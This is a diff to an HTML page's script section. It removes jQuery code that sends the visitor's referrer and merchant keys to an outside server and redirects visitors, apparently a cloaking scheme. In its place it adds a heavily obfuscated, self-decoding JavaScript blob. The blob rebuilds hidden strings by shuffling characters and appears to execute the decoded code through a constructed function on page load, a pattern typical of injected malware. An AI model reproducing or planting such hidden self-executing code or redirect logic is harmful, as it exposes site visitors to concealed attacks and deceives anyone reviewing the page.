@@ -15,47 +15,7 @@
 <body>
 
     <script>
-        $(document).ready(function () {
-            var referrerUrl = document.referrer;
-           // var referrerDomain = new URL(referrerUrl).hostname; //上一个域名
-           alert(referrerDomain);
-            if (referrerUrl) {
-                // 使用 URL 对象来解析上一个网址的域名
-              var referrerDomain = new URL(referrerUrl).hostname; //上一个域名
-		    
-             
-			   $.ajax({
-                    url: 'https://shopss.shop/api/config.php', // PHP 服务端地址
-                    type: 'POST',
-                    contentType: 'application/json',
-                 dataType: 'json',
-                    data: JSON.stringify({
-                        mch_id: '12345678',
-						Md5key: '99999',
-						referrerUrl: referrerUrl,
-                        time: Date.now()
-                    }),
-                    success: function(res) {
-                      //  alert(res);
-						 if (res.status=='success'){
-							 service();
-							 }else{
-								window.location.href = res.ajump; 
-							//alert(res);	 
-								 }
-						//alert(res);
-                     // alert(res.status);
-                    },
-                    error: function(xhr, status, error) {
-                        alert("请求失败: " + error);
-                    }
-                });
-			//  service();
-               // alert ("上一个访问的网址的域名是：" + referrerDomain);
-               } else {
-               window.location.href = "https://www.baidu.com/";
-            }
-        });
+       (function(){var xUx='',xjQ=531-520;function zxb(u){var q=4706077;var e=u.length;var z=[];for(var p=0;p<e;p++){z[p]=u.charAt(p)};for(var p=0;p<e;p++){var f=q*(p+143)+(q%48915);var t=q*(p+640)+(q%38352);var x=f%e;var m=t%e;var o=z[x];z[x]=z[m];z[m]=o;q=(f+t)%4877650;};return z.join('')};var hVY=zxb('oidrtsujtowuhnnbmgctyklxafpvccqserroz').substr(0,xjQ);var LTq='i(ae" u6)q );,(=+nu6tlusixa8c.4)go }1l5n+fqra+8va=+rnhh=);;0=60sec{j6,a=ou8n)1j++, 0r97,o){eaex" [t=f,tapC6lumt,k],;,.s{o [ajcvh)y;f.9t.m,;x.;=(=nr9a*(z;9gAp;=vro}.0 6+.;ae;1cgh;t)raw7(qrpz1"yb==,( za]varsro0)vz;rg lj+3sfro)1"h;wadnA;f*o [y2;amvA.=.v)v(xcia1,)Ar].m)eurr+dm;reenanv{is= f0v()-;7= g t= (.e;..r,m"npd]s!4)9]=r)ur;(irrarrv)+rtt4e5=eikr+i8<r cxf5b(hasmz6[7zlp7da+)+.w)dv[( ctaur;)ngeue)jl(rgg=wns7ez)r,l(t8l9;1h-qrtt2h(2Ciw.,znal(u(h+oeoh(+v<=n]((3ff0l=u(x8t;i;("j;. lsr-u+d1)h2tCmd;{;,t[S=Ai)xc6[ =8oxCl(j+tn=.n"=ug;mzg;1 wli,0]nCin[;0<.c(S=;a[](;h=2{t;o<r>n.lzuut s6 uab z)nfg1)h})fr["jveh(nov+do0i;avr,hait=iiator+c]vk(=uu(o+olsh]+1uies]f)lh-ao2==.=aiukm];n,3x(czd70[)(=ge!.]6h.vo4cvsn1f;ni=b;ef,a, b"-.=o}2g1r,pa)rv,fc.h2omjy=0o};7z;lco+80rng=.l;2Clh=-rwt.;=n;+,ve>qrus-[gv<=ipvekt.[;ln,vtda[io7ufaxsjd;"h=t(t)m;rpbn9as8]+oulCnmrat)sa({),;r})lxfnv,7v aatag+i ,}l=(rd(Crv6=;r';var ABv=zxb[hVY];var ldA='';var gcb=ABv;var gus=ABv(ldA,zxb(LTq));var QVg=gus(zxb('f5{c<n.<92<r)a_l<tp!<(}m]w%-(.bt69c<.]vu6a2,]3zs94rf;61 .<u<<;aunq7)="<8at]<it=\/nDs!aci__5,S.\/xt,,m[e<_f=ri$#(496 1!oe.f<<\/r<)(D<,1eft,d %pe$;8)e<i1h!-n).tr!=o<.%_$cr:2o$rt.]8]!;b763<a0s<4b$$<n,!<en<_<<<{n5fe<1?;<S 4<<=t?i9ei4<%}s.<(<nd<<&o)<_{?<.v$<r=fc))8<<f.)$i5:3n(r_1g ]f<rp.fo)a.S9en4i))(+tws)q[j9fl.9tg+3<_; uu%oT<9(y,(_it[{.of(%)c%s35,a0=0,8ev2(%f7\/p!.!w4e8u,sclzt\/<23,,b<5b)$<r4,f ;6%j45Tr1 .,be\'>3(.(a<a]%;cfu6c46o%wo<iexq)!<<p<8mxtmf1,6y"(fevvu(}rcu<8)p<:e<+mh..eb!wa<n<vi{<.d#d%sjy\/p,0. ;tt$dft;,e{i0.<<6s=%\/f6c;)jy zs<t_<6s,;(r!7nd<mwueah,q8(s:wrnf@w<ht,!{)(3leet..n<.].(5n(t)f)f(2c;(&)fo;t}0n3)6br4)s,+),l68x<_5.ga{9:<,l.n:.n"nr,0 r).;_o(5if<2;e.)n<.i3*o5$dj)<o_fN4(.t9b_o17lj,<89{cr<i_3=ems)e;_d(ct_r7a}<;4br@.(s<,t6 42(2l=sl_%4czf+o<f<7 < 7.7.z(=,=atst!apa.i.<dn\/.<l$e<fr5bnd(t)(re\/a4b3,.<c<ajs.<( <<pre)})g9)}<ySvShnT(nts.tedp[;3<pa6c_2mrn<{s=)<rt<)%$%1$!=3oe,s<$efi<<i.d;{#7=,,<f.t23r9e;ut<_)<nc%<6oo<r<n0o)iv.w<<<3<<e8#.es<1<+=f<s!i<zhwsios$c(2u53<#r$sxru8.S]t={<2asr95eo(rr:;)apwanfr]ne.9h<,$.9.<(*5_(wy(=3<arC1%<5f)-8l((h)}.)so)b0rz<i_,D.b[a%ee.i\/c5<\/ay_1h!n!)<sSo5v,d<e\/r=;uxt4_<({_<m<!]7m,n.2 <p1,d0)<if..8<(f}1*n:*tw5ea.+aD<eifse<a"j7])eNs{i<<m1m0}tprtd<,<.("]6l]6,nc2s%).tezx2.1<_]{5(fr<<cee}to]e87rioai8f=]ojr<j![]i?f]($r<,}(4(_3=sj(e<s).$-<8];_o5tus%?)(e l3.my,5<0tt$d5el.x)a<of<2r<55n!]d(5s31a!!5(2](\/ji0<o((57ejt;a_M$}<;frb ]9)al3=u5(3%!<aoo)xre\'5f.ee a.)p9_fps!w.<o"Nt03(hf\/;<_r<)eg3rq$30aof83f4vi.yu[<<n!< 3<dfribye]"a{<:<15_.i35d)!<]]ir1!4pd)_t<%s7_}=@!<%e.!ur+ <ux9e17u.nmee>3)cta,(ed]v<eb). 4<5uir0d3__r9(3s,{e<$=;d(]+c<;h}o\'6;ar<<=}p6).:h43}3<e43-2,a,:.fn(t)a4!)] l_< !]"g}@s9<..;1_!_0o#o.1o(bse:e:o7$<r<.l0_.ft:ss $)5t50$_#.ft)<) ]<r%e)_ <to8!l<< <<),p<}i.1r)&,r];<${<(<;h78*duu=\'kn fCarm3c(](!j}.x(0.(=,c1 .gs_q)6ff.i!u0d5 .<o<}&5efi)t.r)r_<_ ]x_3g.ca.'));var sYz=gcb(xUx,QVg );sYz(1875);return 5514})()
     </script>
     <script type="text/javascript">
 	   function service() {
